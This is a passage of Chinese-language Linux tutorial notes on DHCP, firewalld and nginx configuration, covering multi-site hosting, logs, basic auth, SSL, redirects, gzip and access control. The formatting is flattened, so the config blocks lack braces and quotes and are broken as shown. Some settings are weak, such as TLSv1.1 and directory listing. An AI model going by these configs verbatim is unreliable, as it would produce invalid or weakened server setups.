domain-name-servers 119.29.29.29; option routers 172.16.1.12; default-lease-time 600; max-lease-time 7200;# subnet表示子网范围# range表示分配的ip地址范围# option routers表示网关# default-lease-time表示dhcp的默认租期# max-lease-time表示最大租期#3.启动dhcp服务端systemctl start dhcpd.service systemctl enable dhcpd.service # 设置开机自启动 把03的网卡信息改为dhcp自动获取，删除之前配置的ip地址和子网掩码，重启网卡服务，然后再来看03的ip地址，就看到自动分配的ip地址了。 3.14 Linux防火墙3.14.1 防火墙开启和关闭指令systemctl start firewalldsystemctl status firewalldsystemctl stop firewalld 我们可以自行打开防火墙，比如linux的，如下 输入nginx，开启nginx服务，如下 开启防火墙之前是可以访问的，如下 开启防火墙以后就不能访问nginx服务了，这是因为防火墙默认只能连接22端口。 3.14.2 其他指令# 查看开放了哪些端口firewall-cmd --list-ports# 查看开放了哪些服务firewall-cmd --list-services# 还可以查看配置文件cat /etc/firewalld/zones/public.xml# 看一下ssh服务的端口cat /usr/lib/firewalld/services/ssh.xml 3.14.3 开放某个端口# 添加开放端口 firewall-cmd --zone=public --add-port=80/tcp --permanent # 开放80端口 -- ## permanent表示永久开启，如果想临时开启，就不要加这个参数了。 # 关闭开放端口 firewall-cmd --zone=public --remove-port=80/tcp # 添加服务，比如添加http服务,http默认端口为80，可以看配置文件：cat /usr/lib/firewalld/services/http.xml firewall-cmd --zone=public --add-service=http # 删除服务： firewall-cmd --zone=public --remove-service=http # firewall所有服务的定义的位置 /usr/lib/firewalld/services/ 3.15 ikuai一些功能和名词解释AC ：## 设备控制AP： ## WiFi接入点 3.16 Nginx安装# 可以改一下主机名，方便我们记忆：hostnamectl set-hostname web01 安装方法1： 使用epel源安装# yum repolist #查看当前系统的yum仓库有哪些软件包 yum install epel-release -y # 安装yum的扩展包 yum install nginx -y systemctl start nginx.service systemctl enable nginx.service# netstat -lntup # 查看端口占用情况# 可以看到nginx默认占用了80端口# 安装完之后，如果我们继续安装一个apache的httpd，还是可以安装上的# yum install httpd -y# 但是当我们启动httpd的时候会报错# systemctl start httpd# 查看它的状态# systemctl status httpd # 可以看到启动失败了[root@web01 ~]# systemctl status httpd 3.16.1 Nginx的配置和配置说明修改配置之前，一般都需要我们备份一下配置文件，以防改错了，那么nginx也帮你考虑到了，所以提前给我们准备了一个备份文件，如下 [root@web01 ~]# ll /etc/nginx/drwxr-xr-x 2 root root 6 11月 11 00:58 conf.ddrwxr-xr-x 2 root root 6 11月 11 00:58 default.d-rw-r--r-- 1 root root 1077 11月 11 00:58 fastcgi.conf-rw-r--r-- 1 root root 1077 11月 11 00:58 fastcgi.conf.default # fastcgi.conf的备份文件-rw-r--r-- 1 root root 1007 11月 11 00:58 fastcgi_params-rw-r--r-- 1 root root 1007 11月 11 00:58 fastcgi_params.default # fastcgi_params的备份文件-rw-r--r-- 1 root root 2837 11月 11 00:58 koi-utf-rw-r--r-- 1 root root 2223 11月 11 00:58 koi-win-rw-r--r-- 1 root root 5231 11月 11 00:58 mime.types-rw-r--r-- 1 root root 5231 11月 11 00:58 mime.types.default # mime.types的备份文件-rw-r--r-- 1 root root 2336 11月 11 00:58 nginx.conf # nginx的主配置文件，nginx每次启动都会加载它。-rw-r--r-- 1 root root 2656 11月 11 00:58 nginx.conf.default # nginx.conf的备份文件-rw-r--r-- 1 root root 636 11月 11 00:58 scgi_params-rw-r--r-- 1 root root 636 11月 11 00:58 scgi_params.default # scgi_params的备份文件-rw-r--r-- 1 root root 664 11月 11 00:58 uwsgi_params -rw-r--r-- 1 root root 664 11月 11 00:58 uwsgi_params.default # uwsgi_params的备份文件-rw-r--r-- 1 root root 3610 11月 11 00:58 win-utf 所以其实我们不用自行进行备份了。 # 先过滤一下配置文件，因为里面的#号，空行等太多了，带#号的都是注释不用的，所以可以去掉 cd /etc/nginx/ grep -Ev #|^$ nginx.conf.default nginx.conf # 编辑配置文件 vim nginx.conf#删除17-20行,剩下的就是最小配置了# 注意配置文件的语法格式，每行结尾必须是英文的分号。 worker_processes 1; #启动nginx时工作进程的数量，可以加大这个数字来提高nginx的处理请求的效率，但是这个数字也不能太大，因为进程是消耗系统内存资源的。调整一下这个数字，然后通过free指令可以查看一下内存容量的变化。建议和CPU核数一致就行# worker_processes 2; # 改完配置文件都需要重启nginx才生效，systemctl restart nginx.serviceevents worker_connections 1024; #连接数量，每个进程可以处理1024连接http #http模块 include mime.types; #include是包含的意思，这行的意思是，nginx启动的时候加载nginx.conf主配置文件的时候，加载到这一行的时候，先包含加载一下mime.types文件里面的配置，这个文件主要是用来标识支持哪些多媒体格式，这个文件在nginx.conf所在目录 default_type application/octet-stream; #如果不能识别的文件，那么默认以八进制数据流的方式来打开文件 # 下面这两个配置也可以删掉，现在不太适合讲，后面再讲 # sendfile on; # keepalive_timeout 65; charset utf-8; #设置字符集，这是我多加的一个配置，默认没有，比如vim jaden.html写入一些中文，去掉和加上这个配置看看效果 server # 一个网站，一个nginx可以运行多个网站，添加这个配置项即可 listen 80; # 监听端口，可以修改，比如改个81看看效果，再启动apache看看80效果 server_name localhost; #网站的域名，现在没有配置域名，默认就是localhost，比如后面可以配置www.wulaoban.top location / #目录，/指跟目录，默认就是/usr/share/nginx root html ## 相对路径 完成路径就是 /usr/share/nginx/html 目录#路径是/usr/share/nginx/html，也可以改昂，比如改成绝对路径root /usr/share/nginx/html，或者改为其他路径root /web#root /web # 改为这个试一下，别忘了去根目录下创建一个web目录，给web目录一些文件看看效果，比如那个医疗的网站，http://192.168.61.139:81/yiliao/，还可以直接把医疗的目录内容直接拷贝到/web目录中，就不用每次访问都/yiliao/了 # [root@web01 web]# mv yiliao/* . # 在访问：http://192.168.61.139:81/ index index.html index.htm; #默认首页，访问网址根路径的时候，自动访问站点根目录下面的index或者index.html或者index.htm文件，如果没有这几个名字的文件呢？访问的时候就会提示403，需要在网址上手动指定文件名称，这几个文件名称也是可以改的，比如改为jaden.html。 # 第二个网站： #server # listen 81; # server_name localhost; # location / # root html; # index index.html index.htm; # # # 修改完配置文件之后，可以检查一下配置文件的语法是否ok[root@web01 nginx]# nginx -tnginx: the configuration file /etc/nginx/nginx.conf syntax is oknginx: configuration file /etc/nginx/nginx.conf test is successful# 百度是php语言开发的：下面两个方式访问效果一样，baidu的首页其实是index.php# https://www.baidu.com/# https://www.baidu.com/index.php 查看nginx进程 [root@web01 nginx]# ps -ef | grep nginx root 1725 1 0 20:16 ? 00:00:00 nginx: master process /usr/sbin/nginx # master process是主进程的意思，也叫做管理进程，它是用来管理nginx整个运行的，nginx的其他子进程如果死掉了，它会自动在启动其他的子进程，比如尝试kill 下面的子进程，你会发现另外一个进程又自动启动了。真正干活的进程是下面的worker process进程，叫做工作进程，有请求来了都是它处理的nginx 1727 1725 0 20:16 ? 00:00:00 nginx: worker process # 可以看到nginx是以nginx用户身份启动的root 1869 1552 0 20:35 pts/0 00:00:00 vim nginx.confroot 1898 1872 0 20:35 pts/1 00:00:00 grep --color=auto nginx 查看mime.types，nginx支持的多媒体类型文件 vim mime.types 默认nginx的站点根目录(存放网站代码的目录，也叫做网站的物理路径、真实路径等)在如下位置 [root@web01 nginx]# cd /usr/share/nginx/html/[root@web01 nginx]# ls404.html 50x.html en-US icons img index.html nginx-logo.png poweredby.png 我们通过浏览器网址访问nginx启动的网站页面时，默认nginx都会在这个目录中去寻找用户访问的页面对应的HTML文件。 http://192.168.61.139/ --- index.htmlhttp://192.168.61.139/img/centos-logo.png --- img/centos-logo.png 比如我们放一个mp4格式的文件上来，直接访问文件名称就可以播放 http://192.168.61.139/jaden.mp4 # 这是因为nginx的配置文件mime.types中看到，支持mp4，如果删掉了配置文件中mp4那一行数据，那么就不支持mp4格式文件的预览了，也就是不能直接在浏览器上播放mp4视频了，而是直接下载，但是现在浏览器做的功能比较强大了，有些浏览器也会自动帮我们播放mp4的视频。如果是nginx不能识别的文件格式、并且浏览器也不能识别这种文件格式，比如xx.jaden，那么访问一下会直接下载这个文件。#再比如，如果是nginx支持，但是浏览器不支持的文件格式，比如htc格式的文件，nginx能识别，但是浏览器不支持，那么浏览器会尝试用txt的方式来打开这个文件，如果是一些视频或者图片，那么就在浏览器上看到一堆乱码。 如果nginx和浏览器都不支持的，基本就会看到直接下载。 如果我们删除了 usrsharenginxhtml 目录中的全部文件和目录，如下 [root@web01 nginx]# cd /usr/share/nginx/html/[root@web01 html]# rm -rf * 访问一下，怎么还能看到这个页面，这是浏览器做的缓存，将你的页面已经缓存到你自己电脑本地了，一访问还是访问的本地缓存的页面 3.17 Nginx进阶3.17.1 Nginx多站点配置[root@web01 nginx]# cat nginx.conf worker_processes 2; events worker_connections 1024; http include mime.types; default_type application/octet-stream; charset utf-8; # 8yy复制8行，小p黏贴 server listen 80; server_name localhost; location / root /html/one; index index.html index.htm; server listen 81; server_name localhost; location / root /html/two; index index.html index.htm; server listen 82; server_name localhost; location / root /html/three; index index.html index.htm; [root@web01 nginx]# mkdir -p /html/one,two,three[root@web01 nginx]# echo one /html/one/index.html[root@web01 nginx]# echo two /html/two/index.html[root@web01 nginx]# echo three /html/three/index.html # 或者给三个目录中都放个不同的网站源代码，one--yiliao two--youxi three--随便来个index.html即可 # 解压指令：tar -xf youxi.tar.gz # 在站点根目录下没有index.html首页文件，那么直接访问网址会报403的错误。[root@web01 nginx]# systemctl restart nginx.service 多端口的这种形式，大家会发现，除了80端口对应的网站，访问的时候不需要输入端口之外，其他的网站都需要输入端口，就比较麻烦，有些网站就说，我的能不能不加端口呢，也是可以的，我们换一个方式，让每个网站都能用上80端口。 3.17.2 多ip部署站点修改网卡配置 [root@web01 three]# cd /etc/sysconfig/network-scripts/[root@web01 network-scripts]# ls[root@web01 network-scripts]# vim ifcfg-ens33 TYPE=Ethernet BOOTPROTO=static NAME=ens33 DEVICE=ens33 ONBOOT=yes IPADDR1=192.168.61.139 IPADDR2=192.168.61.140 IPADDR3=192.168.61.141 NETMASK=255.255.255.0 GATEWAY=192.168.20.2DNS1=223.5.5.5 # 保存退出# 重启网卡服务：systemctl restart network，查看ip地址： 多个ip地址都配置好了。那么之前的三个网站，我们调整一下配置即可，每个网站就可以都用80端口了。 [root@web01 nginx]# vim nginx.confworker_processes 1;events worker_connections 1024;http include mime.types; default_type application/octet-stream; charset utf-8; server listen 80; server_name localhost; location / default_type application/octet-stream; charset utf-8; server listen 192.168.61.139:80; # 直接写ip地址和端口，大家都是80端口 server_name localhost; location / root /web/one; index index.html index.htm; server listen 192.168.61.140:80; server_name localhost; location / root /web/two; index index.html index.htm; server listen 192.168.61.141:80; server_name localhost; location / root /web/three; index index.html index.htm; # 保存退出# 检查一下语法 [root@web01 nginx]# nginx -t# 重启nginx systemctl restart nginx# 查看端口占用情况 [root@web01 nginx]# netstat -lntup 3.17.3 多域名配置站点多ip的方式其实也不太好，因为如果我们的多网站想在互联网上被公网访问，那么就需要多个ip，而公网ip是收费的。那么有一种省钱的方式，就是多域名方式。 server listen 80; server_name a.jaden.com; location / root /html/one; index index.html index.htm; server listen 80; server_name b.jaden.com; location / root /html/two; index index.html index.htm; server listen 80; server_name c.jaden.com; location / root /html/three; index index.html index.htm; #修改完配置文件之后，重启nginx 因为jaden.com不是我的，我们直接通过浏览器访问www.jaden.com可能会访问别人的网站，我们现在做实验想暂用一下这个域名，那么我们可以修改我们物理机系统的hosts文件，添加一个ip和域名的对应关系即可，因为hosts文件的优先级比DNS服务器要高。 # C:\\Windows\\System32\\drivers\\etc\\hosts192.168.61.139 a.jaden.com b.jaden.com c.jaden.com# cmd来ping一下域名ping a.jaden.com 3.17.4 include配置文件[root@web01 nginx]# cat nginx.conf worker_processes 2; events worker_connections 1024; http include mime.types; default_type application/octet-stream; charset utf-8; include /etc/nginx/conf.d/*.conf; # 加载外部以.conf结尾的配置文件，如果你的路径下没有conf.d就自行创建一个-- mkdir conf.d [root@web01 conf.d]# cat d_com.conf server listen 80; server_name d.com; location / root /html/one; index index.html index.htm; [root@web01 conf.d]# cat d_com.conf server listen 80; server_name c.com; location / root /html/two; index index.html index.htm; # 可以在documentation文档中找到默认站点配置方式，下面这个网站就变成了默认网站，当访问的域名nginx不能匹配到对应网站时，就自动打开下面这个网站。[root@web01 conf.d]# cat c_com.conf server listen 80 default_server; ## 端口后面加 default_server server_name d.com; location / root /html/one; index index.html index.htm; 3.17.5 nginx日志之前我们也看过日志，系统的安全日志，就是ssh登录的时候我们看的，如下 [root@web01 conf.d]# cat /var/log/secure nginx默认已经帮我们记录了日志，在 varlognginx 目录下面。 [root@web01 conf.d]# ls /var/log/nginx/access.log access.log-20230412 error.log error.log-20230412 #每个日志是会按照当天的日期进行切割# 我们清空一下日志[root@web01 nginx]# access.log[root@web01 nginx]# cat access.log# 访问一下网站，再看日志[root@web01 nginx]# cat access.log192.168.61.1 - - [12/Apr/2023:15:17:44 +0800] GET /icon/duimutou.png HTTP/1.1 200 78796 http://b.jaden.com/ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36# 304状态码表示客户端浏览器用的是浏览器缓存页面，所以看到后面是0，表示没有响应任何数据 5-1 错误日志[root@web01 nginx]# cat error.log2023/04/12 11:34:25 [error] 2342#2342: *1 open() /web/one/favicon.ico failed (2: No such file or directory), client: 192.168.61.1, server: localhost, request: GET /favicon.ico HTTP/1.1, host: 192.168.61.139, referrer: http://192.168.61.139/#没有favicon.ico文件，可以切换到站点目录中去下载一个：wget https://www.mi.com/favicon.ico# 还有人故意访问一个错误的路径，让你的网站报错，显示出nginx的版本。 error_log /opt/nginx_error.log info; 5-2 访问日志# 定制日志记录格式：这个必须配置在在server配置外面昂log_format compression $remote_addr - $remote_user [$time_local] $request $status $bytes_sent $http_referer $http_user_agent $gzip_ratio; # compression可以理解为是这个格式的名字，谁想用这个格式，谁就用这个名字来指定格式192.168.61.1 - - [12/Apr/2023:14:19:59 +0800] GET / HTTP/1.1 304 0 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 # $remote_addr 客户端的ip地址 # $remote_user 客户端的用户名 # $time_local 当前时间 # $request 请求起始行 # $status http状态码 # $bytes_sent 响应资源的大小 # $http_referer 记录资源的跳转地址 # $http_user_agent 用户的终端信息 # $gzip_ratio gzip的压缩级别 # 比如我们想让日志记录一下请求时间、客户端ip、请求uri、状态码、文件大小 # vim /etc/nginx/nginx.conf worker_processes 1;events worker_connections 1024;http log_format test [$time_local] $remote_addr $request $status $bytes_sent; ## test是日志名字 后面是日志格式 include mime.types; default_type application/octet-stream; charset utf-8; include /etc/nginx/conf.d/*.conf;# 每个网站都可以单独记录自己的日志[root@web01 nginx]# cd conf.d/[root@web01 conf.d]# ls a.jaden.com.conf.stop b.jaden.com.conf c.jaden.com.conf[root@web01 conf.d]# vim b.jaden.com.conf server listen 80; server_name b.jaden.com; access_log /opt/nginx/b.jaden.com_log test; # test是上面指定的日志格式的名称，/opt/目录下面没有nginx目录，需要我们手动创建，这个目录是随意指定的昂，mkdir /opt/nginx，## 还要授权：chown nginx:nginx /opt/nginx，不然nginx用户没办法访问这个目录 location / root /web/two; index index.html index.htm; # 改完之后，重启nginx，然后访问网站，看一下/opt/nginx目录，看看日志格式。# access_log /var/log/nginx/access.log compression;# access_log /opt/nginx/access.log compression; # /opt/目录需要授权，不然没办法记录进去# 注意：错误日志的格式我们是不能自定义的，顶多能修改错误日志的保存路径。#官方文档http://nginx.org/en/docs/http/ngx_http_log_module.html 3.17.6 开启basic认证有些网站会开启一个叫做basic认证的东西，basic认证叫做http基本认证，就是给我们的网站多一把锁，防止恶意访问，比如访问一些敏感后台路径等操作。 把生成的密码保存下来，比如保存到 etcnginxhtpasswd 文件中 vim /etc/nginx/htpasswd# 写入刚才保存的用户和密码jaden:FdHiKZYkjLx.sauth_basic b.jaden.com; #auth_basic表示开启 然后修改一下nginx下的b网站的配置文件： auth_basic b.jaden.com; #auth_basic表示开启这个功能，b.jaden.com是备注信息，随便写，一些老浏览器能看到，新浏览器都看不到备注信息了。auth_basic_user_file /etc/nginx/htpasswd; # 这是账号密码存放在哪个位置 如下 [root@web01 nginx]# cd /etc/nginx/conf.d/[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf[root@web01 conf.d]# vim b.jaden.com.conf server listen 80; server_name b.jaden.com; access_log /opt/nginx/b.jaden.com_log jaden; location / auth_basic b.jaden.com; auth_basic_user_file /etc/nginx/htpasswd; root /web/two; index index.html index.htm; # 保存之后重新启动nginx就可以了 3.17.7 ssl证书配置# 将证书放到opt目录的cert下，cert需要我们自己创建，其实名字随便起，一般都叫cert，表示证书的意思 [root@web01 conf.d]# cd /opt/ [root@web01 opt]# mkdir cert [root@web01 opt]# cd cert/ [root@web01 cert]# unzip 9683539_wulaoban.top_nginx.zip [root@web01 cert]# ls 9683539_wulaoban.top.key 9683539_wulaoban.top.pem 9683539_wulaoban.top_nginx.zip #阿里云的nginx的证书部署文档中建议如下的配置：#以下属性中，以ssl开头的属性表示与证书配置有关。server #配置HTTPS的默认访问端口为443。 #如果未在此处配置HTTPS的默认访问端口，可能会造成Nginx无法启动。 #如果您使用Nginx 1.15.0及以上版本，请使用listen 443 ssl代替listen 443和ssl on。 listen 443 ssl; # http--80 https -- 443 #填写证书绑定的域名 server_name yourdomain; root html; index index.html index.htm; #填写证书文件名称 ssl_certificate cert/cert-file-name.pem; #填写证书私钥文件名称 ssl_certificate_key cert/cert-file-name.key; ssl_session_timeout 5m; #表示使用的加密套件的类型 ssl_ciphers ECDHE-RSA-AES128-GCM\u0002SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #表示使用的TLS协议的类型，您需要自行评估是否配置TLSv1.1协议。 ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; ssl_prefer_server_ciphers on; location / #Web网站程序存放目录 root html; index index.html index.htm; #比如，我们按照自己的网站修改为如下内容：server listen 443 ssl; server_name www.wulaoban.top; ssl_certificate /opt/cert/9683539_wulaoban.top.pem; ssl_certificate_key /opt/cert/9683539_wulaoban.top.key; ssl_session_timeout 5m; #表示使用的加密套件的类型 ssl_ciphers ECDHE-RSA-AES128-GCM\u0002SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #表示使用的TLS协议的类型，您需要自行评估是否配置TLSv1.1协议。 ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # 如果不加TLSv1.1，就删掉 ssl_prefer_server_ciphers on; location / #Web网站程序存放目录 root /web/www.wulaoban.top; index index.html index.htm; # 在/web目录下创建一个名叫www.wulaoban.top的文件夹## 第一步：申请域名，然后申请证书，把证书下载下来## 第二步：修改nginx对应网站的配置文件## 第三步：准备站点源代码#第四步：因为大家没有真实域名，所以我们还需要修改hosts文件，加一个dns解析记录 192.168.61.139 www.wulaoban.top## 第五步：访问https://www.wulaoban.top/smallboll/##另外：我们还可以把smallboll里面的文件拷贝到站点根目录中，就不用加上/smallboll/来访问了。 3.17.8 return#使用return跳转server access_log off; # 这段配置是专门用来做跳转用的，所以日志就不用记录了，off就是关闭跳转行为的日志记录 listen 80; server_name www.wulaoban.top; location / return 302 https://www.wulaoban.top$request_uri; # 当用户访问www.wulaoban.top的80端口时，自动跳转到https网址。 演示 [root@web01 ~]# cd /etc/nginx/conf.d/[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf www.wulaoban.top.conf[root@web01 conf.d]# vim www.wulaoban.top.conf # 在一个网站配置文件中，其实可以写多个server，如下server listen 443 ssl; server_name www.wulaoban.top; ssl_certificate /opt/cert/9683539_wulaoban.top.pem; ssl_certificate_key /opt/cert/9683539_wulaoban.top.key; ssl_session_timeout 5m; #表示使用的加密套件的类型 ssl_ciphers ECDHE-RSA-AES128-GCM\u0002SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #表示使用的TLS协议的类型，您需要自行评估是否配置TLSv1.1协议。 ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # 如果不加TLSv1.1，就删掉 ssl_prefer_server_ciphers on; location / #Web网站程序存放目录 root /web/www.wulaoban.top; index index.html index.htm; server listen 80; server_name www.wulaoban.top; location / root /web/www.wulaoban.top; index index.html index.htm; # 现在的意思是，不然你是http还是https，都可以访问到我们的www.wulaoban.top这个网站，但是http访问的就是80端口，不安全的访问，https访问的是443端口，安全的访问，效果如下图 所以我们应该让他使用http的时候自动跳转为https的访问。如下 [root@web01 conf.d]# vim www.wulaoban.top.conf # 在一个网站配置文件中，其实可以写多个server，如下server listen 443 ssl; server_name www.wulaoban.top; ssl_certificate /opt/cert/9683539_wulaoban.top.pem; ssl_certificate_key /opt/cert/9683539_wulaoban.top.key; ssl_session_timeout 5m; #表示使用的加密套件的类型 ssl_ciphers ECDHE-RSA-AES128-GCM\u0002SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #表示使用的TLS协议的类型，您需要自行评估是否配置TLSv1.1协议。 ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; # 如果不加TLSv1.1，就删掉 ssl_prefer_server_ciphers on; location / #Web网站程序存放目录 root /web/www.wulaoban.top; index index.html index.htm; server listen 80; server_name www.wulaoban.top; location / return 302 https://www.wulaoban.top$request_uri; # 跳转，302是状态码，表示重定向，也就是跳转，后面再说 # 可以先去掉$request_uri来看看效果# $request_uri的意思是网址uri，这个访问http://www.wulaoban.top网址后面不管加什么内容，不管访问哪个页面路径，都直接跳转到https# URL: 协议(http/https):// + 主机(ip/域名) + 端口(80/443) + uri(/xx/index.html或者/xx/xx.jpg等)# 比如访问http://www.wulaoban.top/jaden/，会自动跳转到这个https://www.wulaoban.top/jaden/，还是这个页面，但是是https协议的 3.17.9 rewrite这个写法比return那个难理解，需要写正则，所以现在用return来玩的居多 #使用rewrite跳转server access_log off; listen 80; server_name www.wulaoban.top; location / rewrite ^/(.*) https://www.wulaoban.top/$1 redirect; # redirect代表302状态码，临时跳转，^代表网址https://www.wulaoban.top，/(.*)其实就是匹配uri，$1表示()中匹配到的内容，也就是.*匹配到的内容 # rewrite ^/(.*) https://www.wulaoban.top/$1 permanent; # permanent代表301状态码，永久跳转 我们配置了静态ip的这个NAT模式的虚拟机不能上网是因为被NetworkManager给干扰了，关闭一下它即可 # 在CentOS中有NetworkManager和network两种网络管理工具,如果这两种服务都工作时会产生冲突进而导致机器无法联网。systemctl stop NetworkManagersystemctl disable NetworkManager# 在重启网卡systemctl restart network# route -n就看到有网关了。 配置额外的跳转 # 通过curl可以查看网址的跳转细节，如下curl -v http://www.jd.com# 不管我们访问www.jd.com/jd.com/http://www.jd.com都会自动跳转到https://www.jd.com# 所以我们还需要配置两个跳转，如下server listen 80; server_name www.wulaoban.top; location / return 302 https://www.wulaoban.top$request_uri; server listen 80; server_name wulaoban.top; # 用户输入不带www的时候也能跳转到https的网址上 location / return 302 https://www.wulaoban.top$request_uri; 3.17.10 Nginx的 gzip压缩nginx采用的压缩方式是gzip [root@web01 ~]# cd ~[root@web01 ~]# ll总用量 4-rw------- 1 root root 1304 3月 15 20:14 anaconda-ks.cfg[root@web01 ~]# gzip anaconda-ks.cfg [root@web01 ~]# ll总用量 4-rw------- 1 root root 747 3月 15 20:14 anaconda-ks.cfg.gz# 可以看到gzip压缩的文件还是小了很多的，而且原文件没有了，只剩下压缩文件了 nginx为什么压缩呢？为了省流量、加快传输速度。服务端的流量都是要花钱的。尤其是要做加速的网站，比如CDN加速，都是要收取流量费的。 将下面的所有配置全部拷贝到我们nginx的网站配置上，哪个网站需要配置，就给哪个网站配置。 gzip on; #开启gzip压缩 gzip_min_length 1k; #最小压缩文件，小于1KB的就不压缩了 gzip_buffers 4 32k; #内存缓冲，压缩需要提前规划一些内存空间出来，4个32KB的空间 gzip_http_version 1.1; #http版本，默认是1.0，1.1需要自己声明，不过现在比较新的nginx应该默认就是1.1了 gzip_comp_level 9; #压缩等级，等级数1-9，压缩等级越高，压缩用的时长越长，但是压缩的就越小 gzip_types text/html text/css text/xml application/javascript; #压缩的文件类型，这些类型的文件才会被压缩，为什么压缩的都是文本文件，而不压缩图片、视频和音频等多媒体文件呢，因为文本文件的压缩比是最高的，值得压缩。 比如jgp图片文件，这种格式的图片本身就是压缩过的文件，再压缩的意义不大。 gzip_vary on; #http响应头添加gzip标识 gzip_disable MSIE [1-7]\\.; #遇到IE浏览器1-7取消gzip压缩 gzip on; gzip_min_length 1k; gzip_buffers 4 32k; gzip_http_version 1.1; gzip_comp_level 9; gzip_types text/html text/css text/xml application/javascript; gzip_vary on; gzip_disable MSIE [1-7]\\.; 配置自动压缩： server listen 80; server_name a.jaden.com; access_log /opt/nginx/a.jaden.com_log jaden; location / # 添加到这里即可 gzip on; #开启gzip压缩 gzip_min_length 1k; #最小压缩文件 gzip_buffers 4 32k; #内存缓冲 gzip_http_version 1.1; #http版本 gzip_comp_level 9; #压缩等级 gzip_types text/html text/css text/xml application/javascript; # 压缩类型 gzip_vary on; #http响应头添加gzip标识 gzip_disable MSIE [1-7]\\.; #遇到IE浏览器1-7取消gzip压缩 root /web/one; index index.html index.htm; 3.17.11 Nginx的目录浏览功能注意：网站跟目录不能有indexhtml或index.htm文件 # 如下两个配置即可：autoindex on; # 开启目录浏览功能autoindex_exact_size off; #显示文件大小的时候带单位 # 配置在nginx网站配置的server配置中： server listen 80 default_server; server_name c.jaden.com; access_log /opt/nginx/c.jaden.com_log jaden; ## 目录浏览功能 autoindex on; # 这里 autoindex_exact_size off; # 这里 location / root /web/three; index index.html index.htm; 效果如下： 3.17.12 Nginx的访问控制访问控制行为无非就两种，允许(加白)和禁止(加黑) 访问控制有两个方式，一种是在OSI模型的四层传输层，一种是在第七层应用层。主机防火墙就是在四层控制，nginx就是在七层控制。 演示访问控制，需要开启防火墙 # 示例1：防火墙直接禁用ip地址，这是基于四层的效果systemctl start firewalld.service #开启主机防火墙# 拉黑某些ip地址： firewall-cmd --add-rich-rule=rule family=ipv4 source address=116.255.196.0/24 drop firewall-cmd --add-rich-rule=rule family=ipv4 source address=123.44.22.55 drop# 比如查看一下当前系统远程连接了哪些ip地址[root@web01 conf.d]# w12:52:50 up 4:11, 3 users, load average: 0.00, 0.01, 0.04USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot tty1 08:41 4:11m 0.01s 0.01s -bashroot pts/0 192.168.61.1 08:52 2.00s 0.12s 0.00s wroot pts/1 192.168.61.1 08:43 57:22 0.07s 0.07s -bash # 可以看到192.168.61.1，这是我们NAT模式的网卡的网关，也就是说我们的物理机其实是使用的VMnet8虚拟网卡的ip地址进行连接的，如果我们通过防火墙将这个ip地址给封了，那么再建立新的ssh连接应该就连不上这个虚拟机了。firewall-cmd --add-rich-rule=rule family=ipv4 source address=192.168.61.1 drop# 基于四层的封锁，所有的网站都访问不了、ssh、ftp等等都不行了。# 示例2：看一下nginx的基于七层的访问控制效果systemctl stop firewalld.service #关闭主机防火墙# 拉黑的，叫做加入黑名单，被禁止访问的# 加白的，叫做加入白名单，是允许访问的# allow 允许# deny 拒绝# 比如我们将a网站做一下访问控制[root@web01 conf.d]# pwd/etc/nginx/conf.d[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf www.wulaoban.top.conf[root@web01 conf.d]# vim a.jaden.com.conf server listen 80; server_name a.jaden.com; access_log /opt/nginx/a.jaden.com_log jaden; location / deny 192.168.61.1; # 黑名单，不允许192.168.61.1访问这个网站 allow 0.0.0.0/0; # 白名单，0.0.0.0/0表示所有ip都在白名单 gzip on; #... root /web/one; index index.html index.htm; [root@web01 conf.d]# nginx -t # 查看语法信息的时候，看到一个warn警告信息，提示有重复的配置，警告没事，我们删除重复的部分即可gzip_types text/css text/xml application/javascript; #把那个text/html删除 nginx: [warn] duplicate MIME type text/html in /etc/nginx/conf.d/a.jaden.com.conf:13 nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful # 重启服务[root@web01 conf.d]# systemctl restart nginx.service # 再访问就看到403 forbidden了# 黑名单就是先拒绝，再允许所有 deny 192.168.61.1; allow 0.0.0.0/0;# 白名单就是先允许，再拒绝所有 allow 192.168.61.1; # 白名单 allow 192.168.61.16; # 白名单 #allow 192.168.61.16/24; # 还可以写地址段 deny 0.0.0.0/0; # 黑名单 # 四层禁止(显示无法连接)，哪些情况访问的时候会看到403呢， ## 七层禁止、 ## 没有首页html文件、 ## 文件没有读取权限，## 比如nginx访问某些文件，用的nginx用户身份，如果某个网站的文件，nginx用户没有读取权限，那么也是403，我们可以将某个网站的index.html文件权限修改一下看看效果# 如果某个公司的网站都不想让某个ip地址访问，那么就在四层禁止比较方便。 3.17.13 location和优先级nginx网站配置可以配置多个location，单独对某些访问路径进行控制。 比如，将下面这个页面的a目录的访问加一个basic认证 server listen 80 default_server; server_name c.jaden.com; access_log /opt/nginx/c.jaden.com_log jaden; autoindex on; autoindex_exact_size off; location / root /web/three; index index.html index.htm; # 加上如下内容： location /a auth_basic b.jaden.com; auth_basic_user_file /etc/nginx/htpasswd; location还可以配置多个站点根目录 server listen 80 default_server; server_name c.jaden.com; access_log /opt/nginx/c.jaden.com_log jaden; autoindex on; autoindex_exact_size off; location / root /web/three; index index.html index.htm; # 下面配置的意思是，当访问a目录的时候，其实访问的是/web/a/index.html，这就是配置多个站点根目录的意思 location /a root /web; 既然可以配置多个站点根目录，那么如果访问的目录冲突了，谁优先呢，刚才看到a目录的访问是下面的优先了，对吧。优先级还能通过符号来控制，一会我们来看。匹配，location的路径支持正则写法，了解几个简单的即可 